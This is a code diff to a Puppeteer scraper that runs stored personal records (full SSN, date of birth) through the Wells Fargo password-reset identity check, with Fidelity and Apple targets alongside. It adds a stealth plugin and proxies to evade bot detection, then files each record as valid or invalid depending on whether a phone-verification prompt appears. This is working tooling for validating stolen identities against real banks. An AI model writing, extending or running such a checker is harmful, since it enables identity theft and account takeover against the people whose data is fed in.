@@ -1,8 +1,12 @@
 import axios from 'axios';
-import pupeeteer, { Browser } from 'puppeteer';
+import { Browser } from 'puppeteer';
+import puppeteerExtra from 'puppeteer-extra';
+import StealthPlugin from 'puppeteer-extra-plugin-stealth';
+
 import { Credential } from './interface/credential';
 import {
   LOAN_AMOUNTS,
+  TIMEOUT_WAIT_DEFAULT,
   TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
   TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES,
   TIMEOUT_WAIT_FOR_RESPONSE_APPLE_MINUTES,
@@ -22,6 +26,8 @@ import { ValidateAddresResponse } from './api/apple/interfaces/ValidateAddresRes
 import { DownPaymentResponse } from './api/apple/interfaces/DownPaymentResponse';
 import { FidelitySearchResponse } from './api/fidelity/FidelitySearchResponse';
 
+puppeteerExtra.use(StealthPlugin());
+
 export const TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = minutesToMilliseconds(
   TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
 );
@@ -33,9 +39,7 @@ export const TIMEOUT_WAIT_FOR_RESPONSE_APPLE = minutesToMilliseconds(
   TIMEOUT_WAIT_FOR_RESPONSE_APPLE_MINUTES,
 );
 
-export const TIMEOUT_DEFAULT = minutesToMilliseconds(
-  TIMEOUT_WAIT_FOR_RESPONSE_APPLE_MINUTES,
-);
+export const TIMEOUT_DEFAULT = minutesToMilliseconds(TIMEOUT_WAIT_DEFAULT);
 
 export const SCREENSHOT_DISABLED = true;
 
@@ -90,6 +94,7 @@ interface ConfigurationPerPage {
   pilotflyingj: PageConfiguration;
   apple: PageConfiguration;
   fidelity: PageConfiguration;
+  wfVerify: PageConfiguration;
 }
 
 const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
@@ -112,6 +117,11 @@ const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
   fidelity: {
     pageUrl:
       'https://nb.fidelity.com/public/nbpreloginnav/app/forgotlogindomestic#/forgotLoginDomestic/verifyIdentity',
+    loanAmountSelector: '#amount',
+    formSelector: '#homepage-form',
+  },
+  wfVerify: {
+    pageUrl: 'https://oam.wellsfargo.com/oamo/identity/help/passwordhelp#/',
     loanAmountSelector: '#amount',
     formSelector: '#homepage-form',
   },
@@ -143,7 +153,13 @@ const SELECTORS = {
   day: '#dob-day-input',
   year: '#dob-year-input',
   last4ssn: '#lastFourOfSSN',
-  continue_button: '#nb-prelogin-submit-button',
+  continue_button: 'button[type=submit]',
+  ssn: '#ssn',
+  dob: '#dob',
+  phoneImageModal:
+    '#app-modal-root > div:nth-child(5) > div > div > div > div > div > div > div > div.Dimensions__dimensions___ev7C8.ResponsiveModalContent__dimensions___TGRVM > div > div:nth-child(2) > div.ResponsiveModalListContent__normalInset____tNPh',
+  errorMessage:
+    '#root > div > div > div:nth-child(2) > div > div > div > div:nth-child(1) > div > div > div > div.Identification__messageContainer___mTsX8 > div > div',
 };
 
 // [...document.querySelectorAll("input[name=planSelection]")][1].click()
@@ -220,11 +236,11 @@ export const getCredentialInformationScrapper = async (
 ) => {
   const { pageUrl } = CONFIGURATION_PER_PAGE[pageConfigKey];
 
-  let _browser = await pupeeteer.launch({
+  let _browser = await puppeteerExtra.launch({
     headless: HEADLESS,
     // headless: false,
     // args: ['--proxy-server=162.244.132.210:6021'],
-    // args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
+    args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
   });
 
   // const page = await browser.newPage();
@@ -233,20 +249,20 @@ export const getCredentialInformationScrapper = async (
   page.setDefaultTimeout(TIMEOUT_DEFAULT);
 
   await page.setViewport({
-    width: 1920 / 1.5,
-    height: 1080 / 1.5,
+    width: 400,
+    height: 634,
   });
 
-  await page.setRequestInterception(true);
+  // await page.setRequestInterception(true);
 
-  page.on('request', (request) => {
-    if (['image', 'font'].indexOf(request.resourceType()) !== -1) {
-      // console.log('###Aborting non essential request to speed up site...');
-      request.abort();
-    } else {
-      request.continue();
-    }
-  });
+  // page.on('request', (request) => {
+  //   if (['image', 'font'].indexOf(request.resourceType()) !== -1) {
+  //     // console.log('###Aborting non essential request to speed up site...');
+  //     request.abort();
+  //   } else {
+  //     request.continue();
+  //   }
+  // });
 
   let ip = '';
 
@@ -255,7 +271,7 @@ export const getCredentialInformationScrapper = async (
   try {
     await page.goto(pageUrl, {
       // waitUntil: 'domcontentloaded',
-      waitUntil: 'networkidle0',
+      waitUntil: 'networkidle2',
       timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
     });
 
@@ -270,7 +286,7 @@ export const getCredentialInformationScrapper = async (
 
       await _browser.close();
 
-      _browser = await pupeeteer.launch({
+      _browser = await puppeteerExtra.launch({
         headless: HEADLESS,
         // headless: false,
         args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
@@ -436,39 +452,66 @@ export const getCredentialInformationScrapper = async (
       day,
     });
 
-    await page.type(SELECTORS.firstName, credential.name);
-    await page.type(SELECTORS.lastName, credential.lastname);
-    await page.select(SELECTORS.month, month);
-    await page.type(SELECTORS.day, day);
-    await page.type(SELECTORS.year, String(date.getFullYear()));
-    await page.type(SELECTORS.last4ssn, credential.last4ssn);
+    let newBid = Intl.DateTimeFormat('en-US', {
+      year: 'numeric',
+      month: '2-digit',
+      day: '2-digit',
+      timeZone: 'GMT',
+    }).format(new Date(credential.bid));
 
-    await new Promise((r) => setTimeout(r, 2000));
+    console.log({ newBid });
+
+    console.log('ssn', credential.ssn);
+    await page.waitForSelector(SELECTORS.ssn);
+    await page.type(SELECTORS.ssn, credential.ssn);
+
+    await new Promise((r) => setTimeout(r, 900));
 
     await page.click(SELECTORS.continue_button);
 
-    const validateSearchResponse = (await (
-      await page.waitForResponse(API_URLS.fidelity.search, {
-        timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
-      })
-    )?.json()) as FidelitySearchResponse;
-    // const validateSearchResponse = (await (
-    //   await page.waitForRequest(API_URLS.fidelity.search, {
-    //     timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
-    //   })
-    // )
-    //   .response()
-    //   ?.json()) as FidelitySearchResponse;
+    await new Promise((r) => setTimeout(r, 1500));
 
-    console.log(validateSearchResponse);
+    console.log('dob', newBid);
+    await page.waitForSelector(SELECTORS.dob);
+    await page.type(SELECTORS.dob, newBid);
 
-    const outputMessage = generateOutputMessage(
-      credential,
-      page.url(),
-      validateSearchResponse?.responseBaseInfo?.status?.message,
-    );
+    await Promise.all([await page.click(SELECTORS.continue_button)]);
 
-    validWriteLineOnFile(outputMessage);
+    // const URLIdentityDob =
+    //   'https://oam.wellsfargo.com/oamo/identity/help/passwordReset/identifyCustomerDob';
+
+    // const finalResponse = await page.waitForResponse(
+    //   (response) =>
+    //     response.url().includes(URLIdentityDob) && response.status() === 200,
+    // );
+
+    // console.log({ finalResponse });
+
+    // await new Promise((r) => setTimeout(r, 4000));
+
+    await page.waitForSelector(SELECTORS.phoneImageModal, {
+      timeout: 8000,
+    });
+
+    await new Promise((r) => setTimeout(r, 1000));
+
+    const phoneImageModal = await page.$(SELECTORS.phoneImageModal);
+
+    console.log({ phoneImageModal });
+
+    if (phoneImageModal) {
+      const outputMessage = generateOutputMessage(credential);
+
+      logger.info(outputMessage);
+
+      validWriteLineOnFile(outputMessage);
+    } else {
+      const outputMessage = generateOutputMessage(credential);
+
+      logger.error(outputMessage);
+
+      invalidWriteLineOnFile(outputMessage);
+    }
 
     // await page.type(SELECTORS., String(date.getFullYear()));
     // await page.type(SELECTORS.apple_form.lastName, credential.lastname);
@@ -651,10 +694,7 @@ export const getCredentialInformationScrapper = async (
     // }
   } catch (error) {
     console.error(error);
-    logTracking(
-      `ERROR WITH ${credential.email}!!!`,
-      `${credential.email} || url=${page.url()} `,
-    );
+    logTracking(`ERROR WITH`, credential.email + ' !!');
 
     logger.error(
       `getCredentialInformationScrapper ERROR: ${error} || EMAIL:${
